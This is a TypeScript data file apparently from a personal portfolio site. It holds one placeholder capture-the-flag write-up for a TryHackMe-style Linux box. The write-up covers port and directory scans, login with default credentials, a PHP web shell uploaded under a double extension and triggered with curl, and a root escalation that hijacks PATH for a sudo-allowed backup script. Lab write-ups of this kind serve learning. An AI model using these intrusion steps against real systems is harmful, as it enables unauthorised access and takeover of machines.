// Placeholder machine writeup used to design the layout for this section.
// Real content (condensed from raw enum/exploit/privesc notes) will replace
// this once that conversion work happens.

export type MachinePhase = {
  title: string;
  body: string;
};

export type Machine = {
  slug: string;
  name: string;
  platform: "HackTheBox" | "TryHackMe";
  difficulty: "Easy" | "Medium" | "Hard";
  os: "Linux" | "Windows";
  date: string;
  tags: string[];
  summary: string;
  phases: MachinePhase[];
};

export const machines: Machine[] = [
  {
    slug: "warehouse",
    name: "Warehouse",
    platform: "TryHackMe",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-02-14",
    tags: ["nmap", "cms", "cve", "sudo-misconfig"],
    summary:
      "An easy Linux box built around an outdated inventory CMS, ending in a straightforward sudo privilege escalation. Placeholder writeup used to design this section's layout.",
    phases: [
      {
        title: "Recon",
        body: `A standard full-port scan turns up two services worth chasing.

\`\`\`shell
$ nmap -p- -T4 10.10.94.21
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
\`\`\`

Service and default script scan against the open ports:

\`\`\`shell
$ nmap -p 22,80 -sC -sV 10.10.94.21
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41
| http-title: Warehouse Inventory &mdash; Login
\`\`\`

A directory scan against port 80 surfaces an admin panel and a version
string in the page footer that points at a known-vulnerable CMS release.

\`\`\`shell
$ gobuster dir -u http://10.10.94.21 -w common.txt -x php
/admin                (Status: 301)
/uploads               (Status: 301)
/CHANGELOG.md          (Status: 200)
\`\`\`
`,
      },
      {
        title: "Foothold",
        body: `The changelog confirms the CMS version, which has a public
authenticated file-upload vulnerability (arbitrary PHP upload via the
inventory image field). Default credentials from the vendor docs
(\`admin:admin\`) still work.

Upload a minimal PHP web shell disguised with a double extension to slip
past the extension check, then trigger it directly:

\`\`\`shell
$ curl -F "image=@shell.php.jpg" http://10.10.94.21/admin/upload.php
$ curl "http://10.10.94.21/uploads/shell.php.jpg?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
\`\`\`

Upgrade to a proper shell and grab the user flag from
\`/home/warehouse/user.txt\`.`,
      },
      {
        title: "Privilege escalation",
        body: `\`sudo -l\` as \`www-data\` shows a maintenance script that can be
run as root without a password:

\`\`\`shell
$ sudo -l
(root) NOPASSWD: /opt/warehouse/scripts/backup.sh
\`\`\`

The script shells out to \`tar\` without an absolute path, so a
\`PATH\`-hijacked \`tar\` binary gets executed as root:

\`\`\`shell
$ echo '/bin/bash' > /tmp/tar && chmod +x /tmp/tar
$ sudo PATH=/tmp:$PATH /opt/warehouse/scripts/backup.sh
# whoami
root
\`\`\`
`,
      },
      {
        title: "Loot",
        body: `**User flag:** \`THM{placeholder_user_flag_warehouse}\`

**Root flag:** \`THM{placeholder_root_flag_warehouse}\`
`,
      },
    ],
  },
];

export function getMachine(slug: string): Machine | undefined {
  return machines.find((m) => m.slug === slug);
}
